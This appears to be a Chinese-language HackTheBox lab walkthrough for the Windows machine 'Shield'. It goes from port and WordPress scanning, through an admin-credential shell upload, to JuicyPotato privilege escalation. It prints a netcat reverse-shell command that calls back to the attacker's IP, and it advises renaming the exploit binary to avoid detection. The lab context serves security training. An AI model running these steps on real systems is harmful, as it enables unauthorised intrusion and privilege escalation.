---
title: HackTheBox-Shield
date: 2021-08-18 17:05:21
categories:
- 渗透测试
tags:
- HackTheBox
---

## 实验环境

![](https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png)

## 信息收集

**端口扫描**：

```
namp -A -T4 10.10.10.29
```

发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows

![](https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png)

`--script vuln`参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址

![](https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png)

**目录扫描**，也发现wordpress目录

![](https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png)

**Wpscan分析**，可以看到wordpress的版本

```
wpscan --url http://10.10.10.29/wordpress
```

![](https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png)

## 实验过程

用上一台靶机的账号密码可以登录后台`admin`:`P@s5w0rd!`

![](https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png)

知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块

![](https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png)

设置参数

![](https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png)

执行exploit命令后，获得shell

![](https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png)

在shell中执行命令

![](https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png)

查看wp-config.php，发现敏感信息

![](https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png)

**反弹shell**：

在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口

![](https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png)

在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell

![](https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png)

![](https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png)

查看当前用户

![](https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png)

**提权:**

使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到

将js.exe上传到对方机器

![](https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png)

在windows shell中生成一个bat脚本：

```
echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.107 1111 > shell.bat
```

![](https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png)

在本机使用nc创建一个监听端口，用来接收提权后的windows shell

![](https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png)

运行juicy-potato提权：

```
js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
```

![](https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png)

获得system权限的windows shell

![](https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png)

在管理员账户的桌面目录下找到flag

![](https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png)

